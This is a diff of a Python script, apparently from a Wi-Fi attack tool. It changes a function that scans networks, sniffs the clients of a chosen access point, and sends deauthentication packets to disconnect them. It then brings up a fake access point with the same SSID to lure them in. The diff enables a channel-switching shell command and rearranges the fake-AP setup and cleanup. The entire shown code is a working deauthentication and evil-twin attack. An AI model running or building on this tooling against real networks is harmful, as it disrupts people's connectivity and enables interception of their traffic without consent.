@@ -14,10 +14,10 @@ import argparse
 from multiprocessing import Process
 
 # import functions
-from Deauthentication.configs.config import setMonitorMode
+from Deauthentication.configs.config import setMonitorMode, setManagerMode
 from Deauthentication.scanning.sniffing import sniffClients, scanNetworks
 from Deauthentication.spoofing.spoofing import setTarget
-from FakeAccessPoint.create_fake_ap import create_fake_access_point, build_files
+from FakeAccessPoint.create_fake_ap import create_fake_access_point
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -41,7 +41,7 @@ def attack():
     #interface = wlan ='wlx000f005d5479'
     print(bcolors.OKCYAN+"\nSetting " + wlan + " to monitor mode!\n"+bcolors.ENDC)
     setMonitorMode(wlan)
-
+    
     try:
         print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
         known = scanNetworks(interface)
@@ -52,13 +52,14 @@ def attack():
 
     # Let the user input the MAC address of the router
     print(bcolors.WARNING+"Press Ctrl-C to finish scanning for networks"+bcolors.ENDC)
+    #print(known)
     BSSID = input(bcolors.OKGREEN+'\nChoose the BSSID/MAC address of the AP: \n\n'+bcolors.ENDC)
     #BSSID = 'd8:07:b6:26:2b:56'
     channel = known[BSSID][1]
     #SSID = 'Alperin'
     SSID = known[BSSID][0]
     #print('\nChanging ' + wlan + ' to channel ' + str(channel))
-    #os.system("iwconfig %s channel %d" % (wlan, channel))
+    os.system("iwconfig %s channel %d" % (wlan, channel))
 
     print(bcolors.OKBLUE+"\nIntercepting AP clients data \n"+bcolors.ENDC)
     sniffClients(wlan, BSSID)
@@ -72,14 +73,14 @@ def attack():
     print(bcolors.FAIL+'\nSending deauth packets now, press ctrl+c to end the attack'+bcolors.ENDC)
 
     setTarget(brdMac, interface, BSSID)
+    create_fake_access_point(SSID,wlan)
 
-    build_files(SSID,wlan)
-    create_fake_access_point(SSID)
     user_input = input('to turn off the Access Point Please press \"done\"\n')
     if user_input == 'done':
         print(bcolors.BOLD+bcolors.OKGREEN+"\nDONE! Reverting monitor card back to managed mode :)"+bcolors.ENDC + bcolors.ENDC)        #setManagerMode(wlan)
-        os.system('sudo sh FakeAccessPoint/Templates/cleanup.sh')
-       # print(bcolors.OKBLUE+"\n"+wlan + " is set back to managed mode"+bcolors.ENDC)
+        os.system('sudo sh FakeAccessPoint/scripts/closeAP.sh')
+        setManagerMode(wlan)
+        print(bcolors.OKBLUE+"\n"+wlan + " is set back to managed mode"+bcolors.ENDC)
         sys.exit('Perform exit() with exit code {} , {}'.format(0, "End"))
 
 
